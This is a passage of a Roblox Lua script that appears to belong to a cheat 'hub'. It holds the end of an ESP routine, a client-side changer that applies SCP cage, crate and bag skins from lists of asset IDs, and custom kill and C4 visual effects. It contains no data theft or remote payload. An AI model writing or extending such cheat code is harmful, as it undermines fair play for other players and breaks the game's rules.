            for _, d in pairs(ESPObjects[p]) do pcall(function() d:Remove() end) end
            ESPObjects[p]=nil
        end
    end)
end))
local function SetupSCPObjectCosmetics()
    local CAGE173_KIT_MESH   = "15020613385"
    local CAGE173_BAR_MESH   = "4869664533"
    local SCPCRATE_BOX_MESH  = "134603845534131"
    local BAG096_MESH        = "15020249615"
    local function IsCage173Target(obj)
        if not obj then return false end
        if obj:IsA("MeshPart") then
            local mId = tostring(obj.MeshId):gsub("%D", "")
            if mId == CAGE173_KIT_MESH or mId == CAGE173_BAR_MESH then return true end
        end
        local sm = obj:FindFirstChildOfClass("SpecialMesh")
        if sm then
            local mId = tostring(sm.MeshId):gsub("%D", "")
            if mId == CAGE173_KIT_MESH or mId == CAGE173_BAR_MESH then return true end
        end
        local name = obj.Name:lower():gsub("%s+", ""):gsub("%-", "")
        if name == "cage173" or name == "cage" or (name:find("cage") and not name:find("c4") and not name:find("crate")) then
            return true
        end
        local cur = obj.Parent
        while cur and cur ~= workspace and cur ~= game do
            local pName = cur.Name:lower():gsub("%s+", ""):gsub("%-", "")
            if pName == "cage173" or pName == "cage" or (pName:find("cage") and not pName:find("c4") and not pName:find("crate")) then
                return true
            end
            if cur.Name == "MorphAssets" and (name == "cage173" or name == "cage") then return true end
            cur = cur.Parent
        end
        return false
    end
    local function IsSCPCrateTarget(obj)
        if not obj then return false end
        if obj:IsA("MeshPart") then
            local mId = tostring(obj.MeshId):gsub("%D", "")
            if mId == SCPCRATE_BOX_MESH or mId:find(SCPCRATE_BOX_MESH) then return true end
        end
        local sm = obj:FindFirstChildOfClass("SpecialMesh")
        if sm then
            local mId = tostring(sm.MeshId):gsub("%D", "")
            if mId == SCPCRATE_BOX_MESH or mId:find(SCPCRATE_BOX_MESH) then return true end
        end
        local name = obj.Name:lower():gsub("%s+", ""):gsub("%-", "")
        if name == "scpcrate" then return true end
        local cur = obj.Parent
        while cur and cur ~= workspace and cur ~= game do
            local pName = cur.Name:lower():gsub("%s+", ""):gsub("%-", "")
            if pName == "scpcrate" then return true end
            cur = cur.Parent
        end
        return false
    end
    local function IsBagTarget(name)
        if not name then return false end
        local n = name:lower()
        return n:find("bag") or n:find("sack") or n:find("hood") or (n:find("096") and (n:find("head") or n:find("cont")))
    end
    local function MatchesBagTarget(obj)
        if not obj then return false end
        if obj:IsA("MeshPart") then
            local mId = tostring(obj.MeshId):gsub("%D", "")
            if mId == BAG096_MESH then return true end
        end
        if IsBagTarget(obj.Name) then return true end
        if obj.Parent and IsBagTarget(obj.Parent.Name) then return true end
        local anc = obj:FindFirstAncestorWhichIsA("Model")
        if anc and IsBagTarget(anc.Name) then return true end
        return false
    end
    local SCP_CAGE_SKINS = {
        ["Golden Cage"]         = "15021226330",
        ["Task Force"]          = "15021290242",
        ["Under Construction"]  = "15021290905",
        ["Frozen Cage"]         = "137045628511268",
        ["Gilded Cage"]         = "70574023826254",
        ["Space Age Cage"]      = "70689659342214",
        ["Ashen Cage"]          = "76423598477432",
        ["Oceanic Cage"]        = "73352064414380",
        ["Binary Matrix"]       = "76944762163174",
        ["Reinforced Cage"]     = "122677880820818",
        ["Checkered Cage"]      = "97994116554447",
        ["Steampunk Cage"]      = "96072708183955",
        ["Oriental Cage"]       = "140680588859814",
        ["Jungle Camo Cage"]    = "124016415466044",
        ["Boxing Cage"]         = "72309739962283",
        ["Daybreak Cage"]       = "107144271296173",
        ["Festive Cage"]        = "116225690566896",
        ["GOC Cage"]            = "110101104348933",
        ["GRU-P Cage"]          = "116431013976270",
        ["TSH Cage"]            = "116972796496999",
        ["Ice Cage"]            = "133525472375527",
        ["Black Ice Cage"]      = "137383827069069"
    }
    local SCP_CRATE_SKINS = {
        ["Insurgency Crate"]    = "138806304440979",
        ["Beach Crate"]         = "89777642347941",
        ["Maple Leaf Crate"]    = "139754590463246",
        ["Beehive Crate"]       = "114061476543532",
        ["Valentine's Crate"]   = "96207218871542",
        ["Golden Luxury Crate"] = "6822161361",
        ["Toxic Biohazard Crate"]= "121290404504761",
        ["Cyberpunk Neon Crate"]= "76944762163174",
        ["Void Singularity Crate"]= "120733349948660",
        ["Molten Lava Crate"]   = "6824464030",
        ["Glacial Frost Crate"] = "171424974",
        ["Military Camo Crate"] = "4641726146",
        ["Blood Moon Crate"]    = "82292655867692",
        ["Emerald Crystal Crate"]= "6822194233",
        ["Matrix Digital Crate"]= "91428889211539",
        ["Steampunk Brass Crate"]= "96072708183955",
        ["Dragon Emperor Crate"]= "6824492213",
        ["Deep Space Crate"]    = "98124211294159",
        ["Royal Damascus Crate"]= "6824463630",
        ["Radioactive SCP Crate"]= "122663422109985"
    }
    local SCP_BAG_SKINS = {
        ["Biohazard"]           = "15021175203",
        ["Chaotic"]             = "15021177960",
        ["Practice"]            = "15021176670",
        ["Arctic Camo Bag"]     = "129556083422043",
        ["Arabesque Bag"]       = "138531720288542",
        ["Lunar Bag"]           = "129513981049398",
        ["Ashen Bag"]           = "128588667067813",
        ["Oceanic Bag"]         = "114948815372122",
        ["Hacked Bag"]          = "116714093842094",
        ["Caution Bag"]         = "122663422109985",
        ["Grocery Bag"]         = "99721306508096",
        ["Gear Bag"]            = "94169109388125",
        ["Oriental Bag"]        = "101728466285798",
        ["Jungle Camo Bag"]     = "126248296457193",
        ["Target Bag"]          = "85381543222936",
        ["Pumpkin Bag"]         = "139574075211195",
        ["Festive Bag"]         = "84689512973247",
        ["GOC Bag"]             = "132527349253459",
        ["GRU-P Bag"]           = "100434901439285",
        ["TSH Bag"]             = "97060685371925",
        ["Ice Bag"]             = "115906964237189",
        ["Beach Bag"]           = "82874604075534",
        ["Maple Leaf Bag"]      = "134448020077250"
    }
    local SelectedCageSkin, SelectedCrateSkin, SelectedBagSkin = nil, nil, nil
    local function FormatAssetUrl(id)
        return "rbxassetid://" .. tostring(id):gsub("%D", "")
    end
    local VanillaCache = setmetatable({}, { __mode = "k" })
    local function VanillaIsOurs(inst)
        local nm = inst.Name or ""
        return nm == "CustomSkinTex" or nm == "CustomCageTex" or nm == "CustomSCPTex"
            or nm == "GunAuraEmitter" or nm == "CustomKillFX"
    end
    local function VanillaSnapshotChild(ch)
        local snap = { class = ch.ClassName, name = ch.Name }
        local function grab(k) pcall(function() snap[k] = ch[k] end) end
        if ch:IsA("SurfaceAppearance") then
            grab("ColorMap"); grab("MetalnessMap"); grab("NormalMap"); grab("RoughnessMap")
        elseif ch:IsA("Texture") then
            grab("Texture"); grab("Face"); grab("StudsPerTileU"); grab("StudsPerTileV"); grab("Transparency")
        elseif ch:IsA("Decal") then
            grab("Texture"); grab("Face"); grab("Transparency")
        elseif ch:IsA("SpecialMesh") then
            grab("MeshId"); grab("TextureId"); grab("MeshType"); grab("Scale"); grab("Offset"); grab("VertexColor")
        else
            return nil
        end
        return snap
    end
    local function VanillaSnapshot(part, kind)
        if not part then return end
        if VanillaCache[part] then
            pcall(function()
                if part:GetAttribute("BuloExtraSCPManaged") ~= true then
                    part:SetAttribute("BuloExtraSCPManaged", true)
                end
            end)
            return
        end
        local snap = { kind = kind or "obj", children = {} }
        pcall(function() snap.Color = part.Color end)
        pcall(function() snap.Material = part.Material end)
        pcall(function() snap.Transparency = part.Transparency end)
        pcall(function() if part:IsA("MeshPart") then snap.TextureID = part.TextureID end end)
        for _, ch in ipairs(part:GetChildren()) do
            if not VanillaIsOurs(ch) then
                local cs = VanillaSnapshotChild(ch)
                if cs then table.insert(snap.children, cs) end
            end
        end
        VanillaCache[part] = snap
        pcall(function() part:SetAttribute("BuloExtraSCPManaged", true) end)
    end
    local function VanillaRestore(part)
        local snap = VanillaCache[part]
        if not snap or not part or not part.Parent then return end
        pcall(function() part:SetAttribute("BuloExtraSCPManaged", nil) end)
        for _, ch in ipairs(part:GetChildren()) do
            if VanillaIsOurs(ch) then pcall(function() ch:Destroy() end) end
        end
        pcall(function() if snap.Color then part.Color = snap.Color end end)
        pcall(function() if snap.Material then part.Material = snap.Material end end)
        pcall(function() if snap.Transparency then part.Transparency = snap.Transparency end end)
        pcall(function()
            if snap.TextureID ~= nil and part:IsA("MeshPart") then part.TextureID = snap.TextureID end
        end)
        for _, cs in ipairs(snap.children) do
            pcall(function()
                local inst
                for _, ch in ipairs(part:GetChildren()) do
                    if ch.ClassName == cs.class and ch.Name == cs.name then inst = ch break end
                end
                if not inst then
                    inst = Instance.new(cs.class)
                    inst.Name = cs.name
                    inst.Parent = part
                end
                for k, v in pairs(cs) do
                    if k ~= "class" and k ~= "name" and v ~= nil then
                        pcall(function() inst[k] = v end)
                    end
                end
            end)
        end
    end
    local function StripObjectSkins()
        for part, snap in pairs(VanillaCache) do
            if snap.kind == "obj" and part and part.Parent then
                VanillaRestore(part)
            end
        end
    end
    local function ApplyCage173Skin(target, textureId)
        if not target or not textureId then return end
        local assetUrl = FormatAssetUrl(textureId)
        local function modify(part)
            if not (part:IsA("BasePart") or part:IsA("MeshPart")) then return end
            if part.Transparency > 0.8 then return end
            local pName = part.Name:lower()
            if pName:find("shadow") or pName:find("hitbox") or pName:find("root") or pName:find("collision") then return end
            VanillaSnapshot(part, "obj")
            for _, ch in ipairs(part:GetChildren()) do
                if ch:IsA("SurfaceAppearance") or ch.Name == "CustomCageTex" or ch:IsA("Texture") or ch:IsA("Decal") then
                    ch:Destroy()
                end
            end
            if part:IsA("MeshPart") then
                pcall(function() part.TextureID = assetUrl end)
                part.Color = Color3.fromRGB(255, 255, 255)
            end
            local sm = part:FindFirstChildOfClass("SpecialMesh")
            if sm then
                pcall(function() sm.TextureId = assetUrl end)
                part.Color = Color3.fromRGB(255, 255, 255)
            end
        end
        if target:IsA("BasePart") then modify(target) end
        for _, desc in ipairs(target:GetDescendants()) do
            if desc:IsA("BasePart") then modify(desc) end
        end
    end
    local function ApplySCPCrateSkin(target, textureId)
        if not target or not textureId then return end
        local assetUrl = FormatAssetUrl(textureId)
        local function modify(part)
            if not (part:IsA("BasePart") or part:IsA("MeshPart")) then return end
            if part.Transparency > 0.8 then return end
            VanillaSnapshot(part, "obj")
            for _, ch in ipairs(part:GetChildren()) do
                if ch:IsA("SurfaceAppearance") or ch:IsA("Texture") or ch:IsA("Decal") then ch:Destroy() end
            end
            if part:IsA("MeshPart") then
                pcall(function() part.TextureID = assetUrl end)
                part.Color = Color3.fromRGB(255, 255, 255)
            end
            local sm = part:FindFirstChildOfClass("SpecialMesh")
            if sm then
                pcall(function() sm.TextureId = assetUrl end)
                part.Color = Color3.fromRGB(255, 255, 255)
            end
        end
        if target:IsA("BasePart") then modify(target) end
        for _, desc in ipairs(target:GetDescendants()) do
            if desc:IsA("BasePart") then modify(desc) end
        end
    end
    local function ApplyBagSkin(target, textureId)
        if not target or not textureId then return end
        local assetUrl = FormatAssetUrl(textureId)
        local function modify(part)
            if not part:IsA("BasePart") or part.Transparency > 0.8 then return end
            VanillaSnapshot(part, "obj")
            local isMesh = part:IsA("MeshPart")
            local mesh = not isMesh and part:FindFirstChildOfClass("SpecialMesh") or nil
            local needsDecals = not isMesh and not mesh
            local faces = {}
            for _, ch in ipairs(part:GetChildren()) do
                if ch:IsA("SurfaceAppearance") then
                    ch:Destroy()
                elseif ch.Name == "CustomSCPTex" then
                    if needsDecals and ch:IsA("Decal") and ch.Texture == assetUrl and not faces[ch.Face] then
                        faces[ch.Face] = true
                    else
                        ch:Destroy()
                    end
                end
            end
            if isMesh then
                pcall(function() if part.TextureID ~= assetUrl then part.TextureID = assetUrl end end)
                if part.Color ~= Color3.fromRGB(255, 255, 255) then part.Color = Color3.fromRGB(255, 255, 255) end
            elseif mesh then
                pcall(function() if mesh.TextureId ~= assetUrl then mesh.TextureId = assetUrl end end)
            else
                if part.Color ~= Color3.fromRGB(255, 255, 255) then part.Color = Color3.fromRGB(255, 255, 255) end
                for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
                    if not faces[face] then
                        local decal = Instance.new("Decal")
                        decal.Name = "CustomSCPTex"
                        decal.Texture = assetUrl
                        decal.Face = face
                        decal.Parent = part
                    end
                end
            end
        end
        if target:IsA("BasePart") then modify(target) end
        for _, desc in ipairs(target:GetDescendants()) do
            if desc:IsA("BasePart") then modify(desc) end
        end
    end
    local function ApplyAllSCPSkins(canContinue)
        if not canContinue() then return end
        for _, root in ipairs({workspace, ReplicatedStorage}) do
            local ma = root:FindFirstChild("MorphAssets") or root:FindFirstChild("LoadAsset")
            if ma then
                if SelectedCageSkin then
                    for _, ch in ipairs(ma:GetChildren()) do
                        if IsCage173Target(ch) then ApplyCage173Skin(ch, SelectedCageSkin) end
                    end
                end
                if SelectedCrateSkin then
                    for _, ch in ipairs(ma:GetChildren()) do
                        if IsSCPCrateTarget(ch) then ApplySCPCrateSkin(ch, SelectedCrateSkin) end
                    end
                end
                if SelectedBagSkin then
                    for _, ch in ipairs(ma:GetChildren()) do
                        if MatchesBagTarget(ch) then ApplyBagSkin(ch, SelectedBagSkin) end
                    end
                end
            end
        end
        local function processObject(obj)
            if not obj then return end
            if SelectedCageSkin and IsCage173Target(obj) then
                ApplyCage173Skin(obj, SelectedCageSkin)
            elseif SelectedCrateSkin and IsSCPCrateTarget(obj) then
                ApplySCPCrateSkin(obj, SelectedCrateSkin)
            elseif SelectedBagSkin and MatchesBagTarget(obj) then
                ApplyBagSkin(obj, SelectedBagSkin)
            end
        end
        if Player.Character then
            for _, t in ipairs(Player.Character:GetChildren()) do processObject(t) end
        end
        local bp = Player:FindFirstChild("Backpack")
        if bp then
            for _, t in ipairs(bp:GetChildren()) do processObject(t) end
        end
        for _, vm in ipairs(cur():GetChildren()) do
            if vm:IsA("Model") and not vm:FindFirstChild("Humanoid") then processObject(vm) end
        end
        for index, item in BuloWalkDescendants(workspace) do
            if not canContinue() then return end
            if item:IsA("Model") or item:IsA("Tool") or item:IsA("MeshPart") then processObject(item) end
            if index % 500 == 0 then task.wait() end
        end
    end
    local api = {Cage = SCP_CAGE_SKINS, Crate = SCP_CRATE_SKINS, Bag = SCP_BAG_SKINS}
    local running = true
    local ownedConnections = {}
    local lastScan = 0
    local scanVersion, scanRunning, scanRequested = 0, false, false
    local function requestScan()
        scanVersion += 1
        scanRequested = true
        lastScan = tick()
        if scanRunning then return end
        scanRunning = true
        task.spawn(function()
            while running and not BuloHubUnloaded and scanRequested do
                scanRequested = false
                local current = scanVersion
                local function canContinue()
                    return current == scanVersion and running and not BuloHubUnloaded
                        and (SelectedCageSkin or SelectedCrateSkin or SelectedBagSkin)
                end
                if canContinue() then pcall(ApplyAllSCPSkins, canContinue) end
            end
            scanRunning = false
        end)
    end
    local function connect(signal, fn)
        local connection = signal:Connect(fn)
        table.insert(ownedConnections, connection)
    end
    function api.Names(db)
        local names = {"Default"}
        local extra = {}
        for name in pairs(db) do table.insert(extra, name) end
        table.sort(extra)
        for _, name in ipairs(extra) do table.insert(names, name) end
        return names
    end
    function api.Set(which, name)
        if name == "Default" then name = nil end
        if which == "Cage" then SelectedCageSkin = name and SCP_CAGE_SKINS[name] or nil end
        if which == "Crate" then SelectedCrateSkin = name and SCP_CRATE_SKINS[name] or nil end
        if which == "Bag" then SelectedBagSkin = name and SCP_BAG_SKINS[name] or nil end
        scanVersion += 1
        scanRequested = false
        StripObjectSkins()
        if SelectedCageSkin or SelectedCrateSkin or SelectedBagSkin then requestScan() end
    end
    function api.Refresh()
        if running and not BuloHubUnloaded and (SelectedCageSkin or SelectedCrateSkin or SelectedBagSkin) then
            requestScan()
        end
    end
    local function onAdded(desc)
        if not running or BuloHubUnloaded then return end
        if not (SelectedCageSkin or SelectedCrateSkin or SelectedBagSkin) then return end
        if not (desc:IsA("Model") or desc:IsA("Tool") or desc:IsA("MeshPart")) then return end
        task.defer(function()
            if not running or BuloHubUnloaded or not desc.Parent then return end
            pcall(function()
                if SelectedCageSkin and IsCage173Target(desc) then
                    ApplyCage173Skin(desc, SelectedCageSkin)
                elseif SelectedCrateSkin and IsSCPCrateTarget(desc) then
                    ApplySCPCrateSkin(desc, SelectedCrateSkin)
                elseif SelectedBagSkin and MatchesBagTarget(desc) then
                    ApplyBagSkin(desc, SelectedBagSkin)
                end
            end)
        end)
    end
    connect(workspace.DescendantAdded, onAdded)
    connect(ReplicatedStorage.DescendantAdded, onAdded)
    connect(RS.Heartbeat, function()
        if not running or BuloHubUnloaded or not (SelectedCageSkin or SelectedCrateSkin or SelectedBagSkin) then return end
        if not scanRunning and tick() - lastScan >= 4.5 then requestScan() end
    end)
    function api.Cleanup()
        running = false
        scanVersion += 1
        scanRequested = false
        for _, connection in ipairs(ownedConnections) do pcall(function() connection:Disconnect() end) end
        table.clear(ownedConnections)
        SelectedCageSkin, SelectedCrateSkin, SelectedBagSkin = nil, nil, nil
        StripObjectSkins()
        table.clear(VanillaCache)
    end
    return api
end
local function SetupExtraFx()
    local running = true
    local ownedFx = setmetatable({}, {__mode="k"})
    local Debris = game:GetService("Debris")
    local TweenService = game:GetService("TweenService")
    local KillEffectsModule, killModuleLoading
    local function loadKillEffectsModule()
        if KillEffectsModule or killModuleLoading or not running then return end
        killModuleLoading = true
        task.spawn(function()
            local ok, result = pcall(function() return require(ReplicatedStorage.ClientHandlers.KillEffects) end)
            if running and ok then KillEffectsModule = result end
            killModuleLoading = false
        end)
    end
    local SelectedKillEffect, SelectedC4Effect = nil, nil
    local PlayEffectOnDeath, FxForSelf, FxForOthers = false, false, false
    local ALL_KILL_EFFECTS = {
        "Blackhole", "Ice Cube", "Atomic Rebinding", "Collect Soul", "Cupid's Arrow",
        "Bonfire", "Hydrosphere", "Snow Storm", "Desertification", "Defragmentation",
        "Reconstruction", "Gourmet Meal", "Evaporation", "Black Flame", "Monkey Horde",
        "Knockout", "Disintegration", "Gift Box", "Rainbow Bridge", "Rest In Peace",
        "Northern Lights", "Foundation Seal", "Starception", "Council of 8", "Void Crystal",
        "Thanksgiving2025", "BeeStripe", "Hallowen 2023 Casket", "CandyCane", "GreenCandyCane", "Presents",
        "Coalition Stars", "Yellow Stars", "Serpents Venom",
        "Black Hole Singularity", "Atomic Annihilation", "Sakura Petal Dissolve",
        "Blood Nova Explosion", "Glitch Disintegration", "Golden Halo Ascension",
        "Lightning Smite", "Hellfire Cremation", "Ice Shatter Freeze",
        "Cursed Domain Purge", "Supernova Blast", "Matrix Code Melt",
        "Void Rift Consumption", "Demon Slashes Decapitation", "Soul Reaper Extraction",
        "Cyber Overload Vaporize", "Quantum Teleport Decay", "Holy Light Judgment",
        "Abyssal Tentacles Drag", "Vampiric Bat Scatter",
        "Domain Expansion Void", "Hollow Purple Obliteration", "Sukuna Cleave & Dismantle",
        "Supernova Core Collapse", "Nuclear Detonation Shockwave", "Black Hole Singularity Drain",
        "Soul Reaper Soul Steal", "Pixel Glitch Reality Tear", "Sakura Petal Dispersal",
        "Blood Moon Guillotine", "Lightning Strike Judgment", "Absolute Zero Shatter",
        "Hellfire Cremation Ash", "Golden Ascension to Heaven", "Matrix System Shutdown",
        "Cyberpunk EMP Blast", "Abyssal Kraken Tentacles", "Vampire Bat Swarm Disperse",
        "Dragon Fire Incineration", "Quantum Teleport Vanish", "Chrono Time Freeze Decay",
        "Sonic Wave Pulverize", "Toxic Biohazard Dissolve", "Celestial Comet Impact",
        "Stardust Disintegration", "Mirror Reality Crack"
    }
    local C4_DATA = {
        ["Supernova"]           = {id = "120733349948660", color = Color3.fromRGB(140, 60, 255)},
        ["SCP-3008 (IKEA)"]     = {id = "15420991905",     color = Color3.fromRGB(255, 210, 0)},
        ["Insurgency"]          = {id = "15021615529",     color = Color3.fromRGB(200, 30, 30)},
        ["Freedom"]             = {id = "15420992187",     color = Color3.fromRGB(0, 160, 255)},
        ["'Re: Your Brains'"]   = {id = "15420992046",     color = Color3.fromRGB(50, 220, 90)},
        ["Fiery Explosion"]     = {id = "139473336282527", color = Color3.fromRGB(255, 90, 0)},
        ["Snow Explosion"]      = {id = "129507052510465", color = Color3.fromRGB(180, 240, 255)},
        ["Sand Explosion"]      = {id = "98607824077241",  color = Color3.fromRGB(215, 180, 130)},
        ["Waterspout"]          = {id = "113975548307908", color = Color3.fromRGB(0, 170, 255)},
        ["Integer Overflow"]    = {id = "102467996925868", color = Color3.fromRGB(0, 255, 80)},
        ["Construction Zone"]   = {id = "80922253876944",  color = Color3.fromRGB(255, 200, 0)},
        ["Let Me Cook"]         = {id = "100639704217952", color = Color3.fromRGB(255, 140, 50)},
        ["Gear Explosion"]      = {id = "76571131991726",  color = Color3.fromRGB(200, 150, 90)},
        ["Cherry Blossoms"]     = {id = "78525344606616",  color = Color3.fromRGB(255, 150, 200)},
        ["Monke"]               = {id = "89204551583237",  color = Color3.fromRGB(255, 255, 255)},
        ["Pow Explosion"]       = {id = "93403389873426",  color = Color3.fromRGB(255, 50, 50)},
        ["Ominous Explosion"]   = {id = "94505672182126",  color = Color3.fromRGB(150, 0, 255)},
        ["Black Hole Singularity"] = {id = "120733349948660", color = Color3.fromRGB(40, 0, 90)},
        ["Hollow Purple"]= {id = "120733349948660", color = Color3.fromRGB(160, 20, 255)},
        ["Domain Collapse"]= {id = "139473336282527", color = Color3.fromRGB(220, 20, 40)},
        ["Nuclear Mushroom"]= {id = "139473336282527", color = Color3.fromRGB(255, 180, 0)},
        ["Sakura Petal Burst"]     = {id = "78525344606616",  color = Color3.fromRGB(255, 160, 210)},
        ["Absolute Ice Blast"]   = {id = "129507052510465", color = Color3.fromRGB(170, 240, 255)},
        ["Zeus Divine Bolt"]   = {id = "120733349948660", color = Color3.fromRGB(255, 235, 70)},
        ["Bloody Solar Eclipse"]= {id = "139473336282527", color = Color3.fromRGB(255, 10, 30)},
        ["Cyber-Glitch Reality Break"]= {id = "102467996925868", color = Color3.fromRGB(0, 255, 100)},
        ["Supernova Flash (Nova)"]   = {id = "120733349948660", color = Color3.fromRGB(255, 255, 255)},
        ["Plasma Detonation"]       = {id = "120733349948660", color = Color3.fromRGB(255, 70, 220)},
        ["Infernal Hellfire"]      = {id = "139473336282527", color = Color3.fromRGB(255, 80, 0)},
        ["Holiday Spirit"]      = {id = "105889460718459", color = Color3.fromRGB(255, 40, 40)},
        ["Coalition Entry"]     = {id = "87611331088941",  color = Color3.fromRGB(0, 110, 255)},
        ["Yellow Entry"]        = {id = "120503712839935", color = Color3.fromRGB(255, 220, 0)},
        ["Serpent Entry"]       = {id = "110882336673427", color = Color3.fromRGB(0, 255, 100)},
        ["Maple Leaf Explosion"]= {id = "138928599975445", color = Color3.fromRGB(220, 70, 0)},
        ["Clover"]              = {id = "98233188002298",  color = Color3.fromRGB(40, 220, 40)}
    }
    local DEATH_EXP_TIME = 2.0
    local DEATH_EXP_DIST = 22
    local DeathFxGuard = {
        kill     = setmetatable({}, { __mode = "k" }),
        hooked   = setmetatable({}, { __mode = "k" }),
        marks    = {},
        deathT   = 0,
        deathPos = Vector3.new(0, -99999, 0)
    }
    local C4OnMyDeath = false
    local function MarkDeathPoint(pos, isSelf)
        if not pos then return end
        local now = tick()
        table.insert(DeathFxGuard.marks, { t = now, pos = pos, self = isSelf and true or false })
        for i = #DeathFxGuard.marks, 1, -1 do
            if now - DeathFxGuard.marks[i].t > (DEATH_EXP_TIME * 3) then
                table.remove(DeathFxGuard.marks, i)
            end
        end
        if isSelf then
            DeathFxGuard.deathT = now
            DeathFxGuard.deathPos = pos
        end
    end
    local function IsDeathExplosionNear(pos, selfOnly)
        if not pos then return false end
        local now = tick()
        for i = #DeathFxGuard.marks, 1, -1 do
            local m = DeathFxGuard.marks[i]
            if now - m.t > DEATH_EXP_TIME then
                table.remove(DeathFxGuard.marks, i)
            elseif (not selfOnly or m.self) and (pos - m.pos).Magnitude <= DEATH_EXP_DIST then
                return true
            end
        end
        return false
    end
    local function PlayKillEffectSafe(targetChar, isDeath)
        if not targetChar then return end
        if not SelectedKillEffect then return end
        if not PlayEffectOnDeath then return end
        if isDeath then
            if DeathFxGuard.kill[targetChar] then return end
            DeathFxGuard.kill[targetChar] = true
        end
        local hrp = targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChildWhichIsA("BasePart")
        if not hrp then return end
        local playedByGame = false
        if KillEffectsModule and SelectedKillEffect then
            pcall(function()
                if KillEffectsModule[SelectedKillEffect] then
                    KillEffectsModule[SelectedKillEffect](targetChar, hrp)
                    playedByGame = true
                elseif KillEffectsModule.Bundles and KillEffectsModule.Bundles[SelectedKillEffect] then
                    KillEffectsModule.Bundles[SelectedKillEffect](targetChar)
                    playedByGame = true
                elseif KillEffectsModule.LegacyKillEffects and KillEffectsModule.LegacyKillEffects[SelectedKillEffect] then
                    KillEffectsModule.LegacyKillEffects[SelectedKillEffect](targetChar)
                    playedByGame = true
                end
            end)
        end
        task.spawn(function()
            if not running or BuloHubUnloaded then return end
            local pos = hrp.Position
            local fxFolder = Instance.new("Folder")
            fxFolder.Name = "BuloExtraKillFX"
            fxFolder.Parent = workspace
            local effectSphere = Instance.new("Part")
            effectSphere.Shape = Enum.PartType.Ball
            effectSphere.Size = Vector3.new(2, 2, 2)
            effectSphere.CFrame = CFrame.new(pos)
            effectSphere.Anchored = true
            effectSphere.CanCollide = false
            effectSphere.Material = Enum.Material.Neon
            effectSphere.Transparency = 0.2
            local sel = tostring(SelectedKillEffect or ""):lower()
            local fxColor = Color3.fromRGB(255, 60, 60)
            local tex = "11365689070"
            if sel:find("black") or sel:find("void") or sel:find("abyss") then
                fxColor = Color3.fromRGB(15, 0, 30)
                tex = "120733349948660"
            elseif sel:find("ice") or sel:find("frost") then
                fxColor = Color3.fromRGB(120, 240, 255)
                tex = "82867666729617"
            elseif sel:find("gold") or sel:find("holy") or sel:find("halo") then
                fxColor = Color3.fromRGB(255, 225, 60)
                tex = "5366671365"
            elseif sel:find("sakura") or sel:find("blossom") then
                fxColor = Color3.fromRGB(255, 140, 200)
                tex = "78525344606616"
            elseif sel:find("matrix") or sel:find("glitch") then
                fxColor = Color3.fromRGB(30, 255, 80)
                tex = "91428889211539"
            elseif sel:find("lightning") or sel:find("thunder") then
                fxColor = Color3.fromRGB(0, 220, 255)
                tex = "11365689070"
            elseif sel:find("fire") or sel:find("hell") or sel:find("nova") then
                fxColor = Color3.fromRGB(255, 90, 0)
                tex = "112819328805705"
            end
            effectSphere.Color = fxColor
            effectSphere.Parent = fxFolder
            local emitter = Instance.new("ParticleEmitter")
            emitter.Texture = "rbxassetid://" .. tex
            emitter.Color = ColorSequence.new(fxColor, Color3.fromRGB(255, 255, 255))
            emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 1.5), NumberSequenceKeypoint.new(0.5, 3.5), NumberSequenceKeypoint.new(1, 0)})
            emitter.LightEmission = 1
            emitter.LightInfluence = 0
            emitter.Speed = NumberRange.new(5, 15)
            emitter.SpreadAngle = Vector2.new(180, 180)
            emitter.Lifetime = NumberRange.new(0.8, 1.4)
            emitter.Rate = 0
            emitter.Parent = effectSphere
            emitter:Emit(45)
            local shockwave = Instance.new("Part")
            shockwave.Shape = Enum.PartType.Cylinder
            shockwave.Size = Vector3.new(0.4, 2, 2)
            shockwave.CFrame = CFrame.new(pos) * CFrame.Angles(0, 0, math.rad(90))
            shockwave.Anchored = true
            shockwave.CanCollide = false
            shockwave.Material = Enum.Material.Neon
            shockwave.Color = fxColor
            shockwave.Transparency = 0.3
            shockwave.Parent = fxFolder
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://138186576"
            s.Volume = 1
            s.Parent = effectSphere
            pcall(function() s:Play() end)
            local tweenService = game:GetService("TweenService")
            pcall(function()
                tweenService:Create(effectSphere, TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Size = Vector3.new(18, 18, 18),
                    Transparency = 1
                }):Play()
                tweenService:Create(shockwave, TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Size = Vector3.new(0.2, 26, 26),
                    Transparency = 1
                }):Play()
            end)
            task.delay(1.5, function()
                pcall(function() fxFolder:Destroy() end)
            end)
        end)
    end
    local function SpawnCustomC4(pos, c4Name)
        local eff = c4Name or SelectedC4Effect
        if not eff then return end
        local data = C4_DATA[eff]
        if not data then return end
        local sound = Instance.new("Sound")
        sound.Name = "BuloExtraC4Sound"
        ownedFx[sound] = true
        sound.SoundId = "rbxassetid://9114223180"
        sound.Volume = 2.0
        sound.Parent = workspace
        sound:Play()
        Debris:AddItem(sound, 4)
        local att = Instance.new("Attachment")
        att.Name = "BuloExtraC4Attachment"
        ownedFx[att] = true
        att.WorldPosition = pos
        att.Parent = workspace.Terrain
        local emitter = Instance.new("ParticleEmitter")
        emitter.Texture = "rbxassetid://" .. data.id
        emitter.Color = ColorSequence.new(data.color)
        emitter.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 2.5), NumberSequenceKeypoint.new(0.4, 8), NumberSequenceKeypoint.new(1, 0)})
        emitter.Transparency = NumberSequence.new(0)
        emitter.LightInfluence = 0
        emitter.LightEmission = 1
        emitter.Lifetime = NumberRange.new(1.2, 2.0)
        emitter.Speed = NumberRange.new(12, 25)
        emitter.SpreadAngle = Vector2.new(360, 360)
        emitter.ZOffset = 0.6
        emitter.Parent = att
        local shockwave = Instance.new("Part")
        shockwave.Name = "BuloExtraC4Ring"
        ownedFx[shockwave] = true
        shockwave.Anchored = true
        shockwave.CanCollide = false
        shockwave.Shape = Enum.PartType.Ball
        shockwave.Size = Vector3.new(1, 1, 1)
        shockwave.Material = Enum.Material.Neon
        shockwave.Color = data.color
        shockwave.Transparency = 0
        shockwave.CFrame = CFrame.new(pos)
        shockwave.Parent = workspace
        TweenService:Create(shockwave, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = Vector3.new(30, 30, 30),
            Transparency = 1
        }):Play()
        emitter:Emit(80)
